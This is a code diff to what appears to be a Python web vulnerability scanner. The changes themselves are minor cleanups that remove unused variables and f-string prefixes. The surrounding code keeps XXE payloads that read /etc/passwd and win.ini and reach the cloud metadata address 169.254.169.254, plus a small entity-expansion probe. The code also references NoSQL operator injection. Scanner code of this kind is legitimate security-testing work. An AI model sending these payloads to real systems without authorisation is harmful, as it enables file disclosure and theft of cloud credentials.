@@ -543,7 +543,6 @@ class WebZeroDayScanner:
             async with session.request(method, url, params={param: "test"},
                                         timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                 base_body = await r.text()
-                base_status = r.status
                 base_len = len(base_body)
 
             # MongoDB operator injection via URL parameters
@@ -644,8 +643,7 @@ class WebZeroDayScanner:
         try:
             async with session.request(method, url, params={param: "normal"},
                                         timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
-                base_body = await r.text()
-                base_status = r.status
+                await r.read()  # consume response body to close connection cleanly
 
             for payload_dict in pollution_payloads:
                 try:
@@ -708,21 +706,18 @@ class WebZeroDayScanner:
         Test for XML External Entity injection via multiple attack vectors.
         CWE-611.
         """
-        import uuid as _uuid
-        canary = _uuid.uuid4().hex[:12]
-
         xxe_payloads = [
             # Classic file read
-            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
-             f'<test>&xxe;</test>', "root:x:0", "file_read"),
+            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+             '<test>&xxe;</test>', "root:x:0", "file_read"),
             # Windows file read
-            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
-             f'<test>&xxe;</test>', "[extensions]", "windows_file_read"),
+            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
+             '<test>&xxe;</test>', "[extensions]", "windows_file_read"),
             # SSRF via XXE
-            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
-             f'<test>&xxe;</test>', "ami-id", "ssrf_cloud_metadata"),
+            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
+             '<test>&xxe;</test>', "ami-id", "ssrf_cloud_metadata"),
             # Error-based XXE
-            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
+            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
              "root:", "error_based"),
             # Billion laughs DoS indicator (small payload to test)
             ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
